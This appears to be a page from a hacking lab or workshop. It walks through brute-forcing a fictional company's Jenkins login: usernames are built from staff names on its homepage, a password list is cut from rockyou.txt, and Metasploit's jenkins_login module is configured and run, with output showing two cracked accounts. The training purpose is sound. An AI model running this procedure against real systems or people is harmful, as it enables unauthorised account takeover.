---
title: Jenkins Access
weight: 22
---

In order to use the metasploit login module for jenkins, we need to prepare some options to configure it.

# Prepare Username list

Do you have an idea where you can get the usernames?
{{% expand "Solution" %}}

Refer to the [homepage]({{< ref "/01_targeting/01_nevervictimconsult" >}})  of nevervictimconsult and there you can see the DevOps team.
{{% /expand %}}

Let's create a username list out of those names:

{{% expand "Solution" %}}

```bash
mkdir -p /root/demotalk/jenkinsBrute/
cd /root/demotalk/username-list-generator
rm output.txt user.txt
nano user.txt
```

{{% /expand %}}

Now put the names into nano. Dont take all names to not break too much bruteforce into:
{{% expand "Solution" %}}

```bash
Jeffrey van der Linden
Kay Meyer
Robert Bartsch
Ricardo Pope
```

{{% /expand %}}

Let's use a python script to create the username list out of that file:
{{% expand "Solution" %}}

```bash
python3 userlistcreator.py
```

```bash
mv output.txt /root/demotalk/jenkinsBrute/userlist.txt
cd /root/demotalk/jenkinsBrute/
```

{{% /expand %}}

# Prepare Password list

We still need a password list. Let's use the end of rockyoulist as it contains the sophisticated passwords. It contains 14344392 leaked passwords.
Rockyou.txt is a set of compromised passwords from the social media application developer also known as RockYou. It developed widgets for the Myspace application. In December 2009, the company experienced a data breach resulting in the exposure of more than 32 million user accounts. It was mainly because of the company’s policy of storing the passwords in cleartext:
{{% expand "Solution" %}}

```bash
cd /root/demotalk/jenkinsBrute/
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
```

{{% /expand %}}

# Login Scan Module

If we want to access Jenkins as a user, we still need to find a bit more information of the login options. We need to get the login url.
There are typically two login-URLs in Jenkins-world:

* /j_acegi_security_check"
* /j_spring_security_check
* or something the Administrator configured (like PingAccess or so)

# Prepare Options

Now that we have the needed configuration options, we can use metasploit to brute force login:
{{% expand "Solution" %}}

```bash
msfconsole
```

```bash
use auxiliary/scanner/http/jenkins_login
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 80
set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
set LOGIN_URL j_spring_security_check
set STOP_ON_SUCCESS true
```

```bash
exploit
```

{{% /expand %}}
There will be two successful attempts:

```bash
[+] 34.159.77.191:80 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
[+] 34.159.77.191:80 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
```

Now enjoy logging in to jenkins!
